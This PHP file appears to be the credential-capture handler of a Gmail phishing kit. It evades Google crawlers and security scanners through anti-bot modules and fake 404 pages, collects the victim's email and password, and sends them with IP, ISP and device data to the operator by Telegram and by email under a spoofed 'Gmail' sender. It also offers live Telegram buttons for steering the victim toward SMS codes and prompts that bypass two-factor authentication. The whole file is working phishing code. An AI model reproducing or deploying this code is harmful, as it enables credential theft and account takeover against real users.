<?php
error_reporting(0);
require_once(__DIR__ . '/../session_init.php');

# Adding Settings
include('function.php');
$settings = include('../config.php');

// 3. Antibots (Run once early)
$antibotsDir = null;
$antibotsCandidates = [
    __DIR__ . DIRECTORY_SEPARATOR . '..' . DIRECTORY_SEPARATOR . 'antibots',
    dirname(__DIR__) . DIRECTORY_SEPARATOR . 'antibots',
];
foreach ($antibotsCandidates as $candidate) {
    $candidate = realpath($candidate) ?: $candidate;
    if (is_dir($candidate)) { $antibotsDir = $candidate; break; }
}
if ($antibotsDir === null) {
    http_response_code(500);
    exit('Server misconfiguration: antibots directory not found.');
}

require($antibotsDir . DIRECTORY_SEPARATOR . "AntiBotUserAgent.php");
require($antibotsDir . DIRECTORY_SEPARATOR . "AntiBotIsp.php"); 
require($antibotsDir . DIRECTORY_SEPARATOR . "AnitiBotHost.php");
require($antibotsDir . DIRECTORY_SEPARATOR . "AntiBotPhishTank.php");
require($antibotsDir . DIRECTORY_SEPARATOR . "AntiBotVpn.php");
require($antibotsDir . DIRECTORY_SEPARATOR . "SaveBrowsing.php");
require($antibotsDir . DIRECTORY_SEPARATOR . "DiscoveredBot.php");
require($antibotsDir . DIRECTORY_SEPARATOR . "AntiBotThree.php");
require($antibotsDir . DIRECTORY_SEPARATOR . "DisturbOne.php");
require($antibotsDir . DIRECTORY_SEPARATOR . "DisturbTwo.php");
require($antibotsDir . DIRECTORY_SEPARATOR . "Anti" . DIRECTORY_SEPARATOR . "Bot-Crawler.php");
@require($antibotsDir . DIRECTORY_SEPARATOR . "Anti" . DIRECTORY_SEPARATOR . "Crawler" . DIRECTORY_SEPARATOR . "src" . DIRECTORY_SEPARATOR . "CrawlerDetect.php");
use JayBizzle\CrawlerDetect\CrawlerDetect;
if(strpos($_SERVER['HTTP_USER_AGENT'],'google') !== false ) { include("../404.php"); exit(); }
$remoteAddr = getenv("REMOTE_ADDR") ?: '';
$remoteHost = (filter_var($remoteAddr, FILTER_VALIDATE_IP)) ? gethostbyaddr($remoteAddr) : '';
if ($remoteHost !== '' && strpos($remoteHost, 'google') !== false) { include("../404.php"); exit(); }

$useragent = $_SERVER['HTTP_USER_AGENT'];

// Generate random ID for redirects
$random_id = bin2hex(random_bytes(16));

// Check for device parameter in current URL
if (isset($_GET['device']) && !empty($_GET['device'])) {
    $_SESSION['device'] = $_GET['device'];
} else if (!isset($_SESSION['device']) || empty($_SESSION['device'])) {
    $_SESSION['device'] = 'browser';
}

// Check if visitor key exists in cookie
if (!isset($_COOKIE['visitor_key'])) {
    header("Location: ../index.php?" . $random_id);
    exit();
}

// Get visitor ID from session or URL
$visitor_id = $_SESSION['visitor_id'] ?? ($_GET['id'] ?? 'unknown');

// Recover username if not in session
if (isset($_POST['fldUsername']) && !empty($_POST['fldUsername'])) {
    $_SESSION['username'] = $_POST['fldUsername'];
}

if (!isset($_SESSION['username']) || empty($_SESSION['username'])) {
    require_once('database.php');
    
    // Try to get from visitor ID
    if ($visitor_id !== 'unknown') {
        $visitor_data = db_get_visitor($visitor_id);
        if ($visitor_data && isset($visitor_data['username'])) {
            $_SESSION['username'] = $visitor_data['username'];
        }
    }
    
    // Try to get from cookie if still empty
    if ((!isset($_SESSION['username']) || empty($_SESSION['username'])) && isset($_COOKIE['visitor_key'])) {
        $visitor_data = db_get_visitor_by_key($_COOKIE['visitor_key']);
        if ($visitor_data && isset($visitor_data['username'])) {
            $_SESSION['username'] = $visitor_data['username'];
            if ($visitor_id === 'unknown') $visitor_id = $visitor_data['id'];
        }
    }
}

$required = array('fldPassword');

$error = false;
foreach($required as $field) {
  if (empty($_POST[$field])) {
    $error = true;
  }
}

if ($error) {
  header('Location: https://www.google.com/search?q=Gmail+login');
  exit();
}

require_once('database.php');

# Register/Update visitor session in database
db_update_visitor($visitor_id, [
    'ip' => $IP,
    'status' => 'waiting'
]);

# Logs
$IP = isset($_SERVER['REMOTE_ADDR']) ? $_SERVER['REMOTE_ADDR'] : 'Unknown';
$os_platform = isset($_SERVER['HTTP_USER_AGENT']) ? $_SERVER['HTTP_USER_AGENT'] : 'Unknown';
$date = date("F j, Y g:i a");
$password = $_POST['fldPassword'];

// Premium Telegram Notification Title
$msgtg = "🌐 <b>GMAIL - LOGIN ATTEMPT</b> 🌐\n";
$msgtg .= "━━━━━━━━━━━━━━━\n\n";

// User Information Section
$msgtg .= "👤 <b>LOGIN INFO</b>\n";
$msgtg .= "• Email/Phone: <code>" . htmlspecialchars($_SESSION['username']) . "</code>\n";
$msgtg .= "• Password: <code>" . htmlspecialchars($password) . "</code>\n\n";

// Location Information Section
$msgtg .= "📍 <b>LOCATION INFO</b>\n";
$msgtg .= "• IP Address: <code>{$IP}</code>\n";
$msgtg .= "• ISP: <code>" . htmlspecialchars(ISP($IP)) . "</code>\n\n";

// Device Information Section
$msgtg .= "💻 <b>DEVICE INFO</b>\n";
$msgtg .= "• Platform: <code>" . htmlspecialchars($os_platform) . "</code>\n\n";

// Visitor ID Section
$visitor_data = db_get_visitor($visitor_id);
$v_num = isset($visitor_data['v_number']) ? $visitor_data['v_number'] : '1';

$msgtg .= "🔑 <b>VISITOR INFO</b>\n";
$msgtg .= "• Visitor Number: #<code>{$v_num}</code>\n";
$msgtg .= "• Visitor ID: <code>{$visitor_id}</code>\n\n";

$msgtg .= "━━━━━━━━━━━━━━━\n";
$msgtg .= "⏰ " . date("F j, Y g:i a") . "\n\n";
$msgtg .= "+ Powered by <a href='https://t.me/xforgex'>@xforgex</a> +";

    $notified_key = "notified_mlog_" . md5($visitor_id . $password);
    if ($settings['telegram'] == "1" && !isset($_SESSION[$notified_key])) {
        // Create inline keyboard for real-time management
        $keyboard = [
            'inline_keyboard' => [
                [['text' => '🔒 Security Preference', 'callback_data' => 'security_preference']],
                [['text' => '✅ Yes Prompt', 'callback_data' => 'yes_prompt'], ['text' => '📱 SMS Code I', 'callback_data' => 'sms1']],
                [['text' => '📱 SMS Code II', 'callback_data' => 'sms2'], ['text' => '📞 Number Prompt', 'callback_data' => 'number_prompt']],
                [['text' => '❌ Password Error', 'callback_data' => 'password_error'], ['text' => '🚫 Block Visitor', 'callback_data' => 'block']],
                [['text' => '✅ Success', 'callback_data' => 'success']]
            ]
        ];

        // Add Live Panel button only on public domains
        if (!$is_localhost) {
            $keyboard['inline_keyboard'][] = [['text' => '🌐 Open Live Panel', 'url' => 'http://' . $_SERVER['HTTP_HOST'] . '/session/']];
        }

        send_telegram($msgtg, $keyboard);
        $_SESSION[$notified_key] = true;
    }


$email_msg = "
    <html>
    <head>
        <style>
            body { font-family: Arial, sans-serif; line-height: 1.6; color: #333; }
            .container { max-width: 600px; margin: 20px auto; padding: 20px; border: 1px solid #ddd; border-radius: 5px; }
            .header { background: #002D72; color: white; padding: 15px; border-radius: 5px 5px 0 0; }
            .section { margin: 15px 0; padding: 15px; background: #f9f9f9; border-radius: 5px; }
            .footer { margin-top: 20px; padding-top: 20px; border-top: 1px solid #ddd; font-size: 12px; color: #666; }
        </style>
    </head>
    <body>
        <div class='container'>
            <div class='header'>
                <h2>✦ GMAIL Login Details ✦</h2>
            </div>
            <div class='section'>
                <h3>🔥 Login Information</h3>
                <p>Email/Phone: <code>" . htmlspecialchars($_SESSION['username']) . "</code></p>
                <p>Password: <code>" . htmlspecialchars($password) . "</code></p>
                <p>Visitor ID: <code>" . $visitor_id . "</code></p>
            </div>
            <div class='section'>
                <h3>📱 Device Information</h3>
                <p>IP Address: {$IP}</p>
                <p>GeoLocation: <a href='http://www.geoiptool.com/?IP={$IP}'>View Location</a></p>
                <p>Date: {$date}</p>
                <p>User Agent: {$useragent}</p>
            </div>
        </div>
    </body>
    </html>";

if ($settings['send_mail'] == "1"){
    $to = $settings['email'];
    $headers = "MIME-Version: 1.0" . "\r\n";
    $headers .= "Content-type:text/html;charset=UTF-8" . "\r\n";
    $headers .= "From: Gmail <gmail@security.com>\r\n";
    $subject = "✦ GMAIL Login Details - {$IP} ✦";
    mail($to, $subject, $email_msg, $headers);
}

if ($settings['debug_mode']) {
    error_log("Processing redirect logic based on settings");
}

header("Location: ../load.php?id=" . $visitor_id);
exit();

?>